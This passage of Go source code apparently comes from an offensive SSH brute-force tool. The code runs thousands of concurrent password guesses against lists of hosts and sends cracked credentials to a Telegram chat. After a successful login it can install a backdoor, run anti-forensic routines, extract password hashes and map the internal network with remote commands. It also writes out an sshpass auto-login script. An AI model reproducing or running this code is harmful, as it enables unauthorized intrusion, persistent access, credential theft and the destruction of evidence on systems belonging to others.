		cancel:  cancel,
		limiter: limiter,
	}
}

func (wp *WorkerPool) Start() {
	for i := 0; i < wp.workers; i++ {
		wp.wg.Add(1)
		go wp.worker()
	}
}

func (wp *WorkerPool) worker() {
	defer wp.wg.Done()
	for {
		select {
		case <-wp.ctx.Done():
			return
		case job, ok := <-wp.jobs:
			if !ok {
				return
			}
			if err := wp.limiter.Wait(wp.ctx); err != nil {
				return
			}
			result := wp.processJob(job)
			select {
			case wp.results <- result:
			case <-wp.ctx.Done():
				return
			}
		}
	}
}

func safeGoroutine(fn func()) {
	go func() {
		defer func() {
			if r := recover(); r != nil {
				fmt.Printf("[PANIC] Recovered in goroutine: %v\n", r)
				if config.TelegramToken != "" && config.TelegramChatID != "" {
					go internal.SendTelegramMessage(config.TelegramToken, config.TelegramChatID,
						fmt.Sprintf("⚠️ PANIC: %v", r))
				}
			}
		}()
		fn()
	}()
}

func GetFullSSHBanner(host, port string, timeout int) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	buf := make([]byte, maxBannerSize)
	n, err := conn.Read(buf)
	if err != nil {
		return "", err
	}
	if n > 0 {
		banner := strings.TrimSpace(string(buf[:n]))
		if len(banner) > 255 {
			banner = banner[:255]
		}
		return banner, nil
	}
	return "", fmt.Errorf("no banner received")
}

func (wp *WorkerPool) processJob(job Job) Result {
	atomic.AddInt64(&TotalAttempts, 1)

	cfg := &ssh.ClientConfig{
		User:            job.User,
		Auth:            []ssh.AuthMethod{ssh.Password(job.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(job.Timeout) * time.Second,
	}

	conn, err := net.DialTimeout("tcp", net.JoinHostPort(job.Host, job.Port), time.Duration(job.Timeout)*time.Second)
	if err != nil {
		atomic.AddInt64(&FailedAttempts, 1)
		return Result{Success: false, Error: err}
	}
	defer conn.Close()

	if job.CityIdx >= 0 && job.CityIdx < len(CityRoutes) {
		route := CityRoutes[job.CityIdx]
		fmt.Printf("%s[ROUTE] %s via %s (latency: %dms)%s\n", colors.Yellow, job.Host, route.Name, route.Latency, colors.Reset)
		time.Sleep(time.Duration(route.Latency) * time.Millisecond)
	}

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(job.Host, job.Port), cfg)
	if err != nil {
		atomic.AddInt64(&FailedAttempts, 1)
		return Result{Success: false, Error: err}
	}
	defer sshConn.Close()

	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()

	atomic.AddInt64(&SuccessAttempts, 1)

	if job.DoBackdoor && job.Backdoor.Enabled {
		safeGoroutine(func() {
			ex.InstallBackdoor(job.Host, job.Port, job.User, job.Password, job.Backdoor)
		})
	}
	if job.DoAntiForensic && afm != nil {
		go afm.RunAll(client)
	}

	banner, _ := GetFullSSHBanner(job.Host, job.Port, job.Timeout)

	return Result{
		Success:  true,
		Host:     job.Host,
		Port:     job.Port,
		User:     job.User,
		Password: job.Password,
		Banner:   banner,
	}
}

func (wp *WorkerPool) AddJob(job Job) {
	select {
	case wp.jobs <- job:
	case <-wp.ctx.Done():
	}
}

func (wp *WorkerPool) Results() <-chan Result {
	return wp.results
}

func (wp *WorkerPool) Stop() {
	wp.cancel()
	close(wp.jobs)
	wp.wg.Wait()
	close(wp.results)
}

func IsHostBanned(host string, cp *Checkpoint) bool {
	cp.RLock()
	defer cp.RUnlock()
	if cp.BannedHosts == nil {
		return false
	}
	_, exists := cp.BannedHosts[host]
	if exists {
		fmt.Printf("%s[!] Host %s is banned%s\n", colors.Yellow, host, colors.Reset)
	}
	return exists
}

func scanInternalNetwork(host, port, user, pass string) []string {
	fmt.Printf("%s[NETWORK MAP] Scanning internal network from %s%s\n", colors.Magenta, host, colors.Reset)
	var internalHosts []string
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
	if err != nil {
		return internalHosts
	}
	defer conn.Close()
	session, err := conn.NewSession()
	if err != nil {
		return internalHosts
	}
	defer session.Close()
	commands := []string{
		"ip route | grep -E 'src|via' | awk '{print $1}' | grep -E '^[0-9]' 2>/dev/null",
		"arp -n 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}'",
		"cat /etc/hosts 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}'",
	}
	hostMap := make(map[string]bool)
	for _, cmd := range commands {
		var stdoutBuf bytes.Buffer
		session.Stdout = &stdoutBuf
		session.Run(cmd)
		lines := strings.Split(strings.TrimSpace(stdoutBuf.String()), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && !hostMap[line] && !strings.Contains(line, "255") && !strings.Contains(line, "0.0.0.0") {
				hostMap[line] = true
				internalHosts = append(internalHosts, line)
			}
		}
		stdoutBuf.Reset()
	}
	if len(internalHosts) > 0 {
		f, _ := os.OpenFile("internal_network.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if f != nil {
			defer f.Close()
			for _, h := range internalHosts {
				fmt.Fprintf(f, "%s\n", h)
			}
		}
	}
	fmt.Printf("%s[NETWORK MAP] Found %d internal hosts%s\n", colors.Green, len(internalHosts), colors.Reset)
	return internalHosts
}

func GetCrackedList() []string {
	crackedMu.RLock()
	defer crackedMu.RUnlock()
	result := make([]string, len(crackedList))
	copy(result, crackedList)
	return result
}

func SetCrackedBuffer(cb *CircularBuffer) {
	crackedBuffer = cb
}

func AddToCrackedList(entry string) {
	crackedMu.Lock()
	defer crackedMu.Unlock()
	crackedList = append(crackedList, entry)
	if crackedBuffer != nil {
		crackedBuffer.Append(entry)
	}
}

func RunSSH(hosts []string, port string, users, passes []string, mode string, timeout, minDelay, maxDelay, resumeIdx, notify int, smartPass bool, postExploit, scanNetwork, extractHash, generateScript bool, cp *Checkpoint, backdoor ex.BackdoorConfig, doBackdoor bool, ramdiskPath string, multiCityEnabled bool, massPwnEnabled bool, doAntiForensic bool) {
	totalHosts := len(hosts)
	totalUsers := len(users)
	totalPasses := len(passes)

	if massPwnEnabled {
		massPwn(hosts, port, users, passes, timeout, 5000)
		return
	}

	if totalHosts == 0 {
		fmt.Printf("[ERROR] No hosts to test!\n")
		return
	}
	if totalUsers == 0 {
		fmt.Printf("[ERROR] No users to test!\n")
		return
	}
	if totalPasses == 0 {
		fmt.Printf("[ERROR] No passwords to test!\n")
		return
	}

	fmt.Printf("[SSH] Mode: %s | Users: %d | Pass: %d | Hosts: %d | Random Delay: %d-%dms | SmartPass: %v | Backdoor: %v | MultiCity: %v | AntiForensic: %v\n\n",
		mode, totalUsers, totalPasses, totalHosts, minDelay, maxDelay, smartPass, doBackdoor, multiCityEnabled, doAntiForensic)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Printf("\n%s[SHUTDOWN] Saving checkpoint...%s\n", colors.Yellow, colors.Reset)
		cancel()
	}()

	wp := NewWorkerPool(2000, 500)
	wp.Start()

	var wg sync.WaitGroup
	var stopFlag int32
	startHost := resumeIdx
	if startHost < 0 {
		startHost = 0
	}

	go func() {
		for result := range wp.Results() {
			if result.Success {
				fmt.Printf("\n%sok CRACKED:%s %s@%s:%s | %s\n",
					colors.Green, colors.Reset, result.User, result.Host, result.Port, result.Password)

				entry := fmt.Sprintf("%s:%s|%s:%s|%s", result.Host, result.Port, result.User, result.Password, result.Banner)

				crackedMu.Lock()
				crackedList = append(crackedList, entry)
				crackedMu.Unlock()

				if crackedBuffer != nil {
					crackedBuffer.Append(entry)
					time.Sleep(10 * time.Millisecond)
				}

				if cp != nil {
					cp.AddCracked(result.Host, result.Port, result.User, result.Password)
					SaveCheckpoint(cp)
				}
				if notify == 1 && config.TelegramToken != "" && config.TelegramChatID != "" {
					go internal.SendTelegramNotification("cracked", map[string]interface{}{
						"host": result.Host, "port": result.Port,
						"user": result.User, "pass": result.Password, "banner": result.Banner,
					})
				}
				if postExploit {
					go ex.P0stExploit(result.Host, result.Port, result.User, result.Password)
				}
				if scanNetwork {
					go scanInternalNetwork(result.Host, result.Port, result.User, result.Password)
				}
				if extractHash {
					go ex.ExtractHashes(result.Host, result.Port, result.User, result.Password)
				}
			}
			atomic.AddInt32(&CompletedHosts, 1)
		}
	}()

	for idx := startHost; idx < totalHosts && atomic.LoadInt32(&stopFlag) == 0 && atomic.LoadInt32(&GlobalStop) == 0; idx++ {
		select {
		case <-ctx.Done():
			goto done
		default:
		}
		host := hosts[idx]

		fmt.Printf("[%d/%d] Testing: %s\n", idx+1, totalHosts, host)

		testPasses := make([]string, len(passes))
		copy(testPasses, passes)

		comboCount := 0
		for _, u := range users {
			for _, p := range testPasses {
				comboCount++
				wg.Add(1)
				go func(h, u, p string) {
					defer wg.Done()
					randomDelay(minDelay, maxDelay)
					wp.AddJob(Job{
						Host:           h,
						Port:           port,
						User:           u,
						Password:       p,
						Timeout:        timeout,
						CityIdx:        -1,
						Backdoor:       backdoor,
						DoBackdoor:     doBackdoor,
						DoAntiForensic: doAntiForensic,
					})
				}(host, u, p)
			}
		}
	}

done:
	wg.Wait()
	wp.Stop()
	cancel()

	if cp != nil {
		cp.Lock()
		cp.Completed = true
		cp.Unlock()
		SaveCheckpoint(cp)
	}
	if generateScript && len(crackedList) > 0 {
		generateExecutableScript()
	}
}

func generateExecutableScript() {
	script := `#!/bin/bash
# Auto-generated login script
# Generated: ` + time.Now().Format("2006-01-02 15:04:05") + `
CRACKED_FILE="Cracked.txt"
if [ ! -f "$CRACKED_FILE" ]; then
    echo "No cracked credentials found"
    exit 1
fi
echo "=== Vandor Auto Login Script ==="
echo ""
SUCCESS_FILE="auto_login_success.txt"
> "$SUCCESS_FILE"
while IFS= read -r line; do
    if [[ $line =~ (.+):([0-9]+)\|(.+):(.+)\|(.+) ]]; then
        HOST="${BASH_REMATCH[1]}"
        PORT="${BASH_REMATCH[2]}"
        USER="${BASH_REMATCH[3]}"
        PASS="${BASH_REMATCH[4]}"
        echo "[*] Testing $USER@$HOST:$PORT"
        if command -v sshpass &> /dev/null; then
            timeout 5 sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$PORT" "$USER@$HOST" "echo 'Connected successfully'" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[+] SUCCESS: $USER@$HOST:$PORT | $PASS"
                echo "$USER@$HOST:$PORT|$PASS" >> "$SUCCESS_FILE"
            fi
        else
            echo "Install sshpass: apt install sshpass or brew install hudochenkov/sshpass/sshpass"
            break
        fi
    fi
done < "$CRACKED_FILE"
echo ""
echo "Results saved to $SUCCESS_FILE"
`
	os.WriteFile("auto_login.sh", []byte(script), 0755)
	fmt.Printf("%s[SCRIPT] Generated auto_login.sh%s\n", colors.Green, colors.Reset)
}

func (c *SafeCache) cleanup() {
	ticker := time.NewTicker(c.ttl / 2)
	defer ticker.Stop()
	for {
		select {
		case <-c.stopCh:
			return
		case <-ticker.C:
			c.mu.Lock()
			now := time.Now()
			for k, v := range c.data {
				if now.After(v.ExpiresAt) {
					delete(c.data, k)
				}
			}
			c.mu.Unlock()
		}
	}
}

func NewSafeCache(maxSize int, ttl time.Duration) *SafeCache {
	cache := &SafeCache{
		data:    make(map[string]CacheItem),
		maxSize: maxSize,
		ttl:     ttl,
		stopCh:  make(chan struct{}),
	}
	go cache.cleanup()
	return cache
}

func (cp *Checkpoint) Lock() {
	cp.mu.Lock()
}

func (cp *Checkpoint) Unlock() {
	cp.mu.Unlock()
}

func (cp *Checkpoint) RLock() {
	cp.mu.RLock()
}

func (cp *Checkpoint) RUnlock() {
	cp.mu.RUnlock()
}

func (cp *Checkpoint) GetHosts() []string {
	cp.mu.RLock()
	defer cp.mu.RUnlock()
	return cp.Hosts
}

func (cp *Checkpoint) SetHosts(hosts []string) {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	cp.Hosts = hosts
}

func (cp *Checkpoint) GetFailedHosts() map[string]int {
	cp.mu.RLock()
	defer cp.mu.RUnlock()
	return cp.FailedHosts
}

func (cp *Checkpoint) GetBannedHostsMap() map[string]string {
	cp.mu.RLock()
	defer cp.mu.RUnlock()
	return cp.BannedHosts
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
